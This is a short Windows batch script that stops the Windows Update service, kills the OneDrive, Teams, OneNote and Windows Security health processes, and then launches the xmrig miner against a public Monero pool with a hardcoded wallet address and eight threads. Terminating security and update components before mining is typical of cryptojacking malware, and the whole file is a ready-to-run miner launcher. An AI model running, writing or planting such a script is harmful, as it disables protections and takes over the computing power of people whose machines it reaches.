@echo off
net stop WUAUSERV
taskkill /IM OneDrive.exe
taskkill /IM SecurityHealthSystray.exe
taskkill /IM SecurityHealthService.exe
taskkill /IM ONENOTEM.exe
taskkill /IM Teams.exe
cd /d "%~dp0"
xmrig.exe --coin=XMR -o pool.supportxmr.com:8080 -u 8635LEjQNMTKA3itCDvKGujmHLgYn33hhjiX7uat5VKhi7WThxFw8t5C2mfaiaF86JHCPHWWTmHZwjEgVt9RNAyo7ueQgKW.S-xmr1 -p x -t 8
pause 
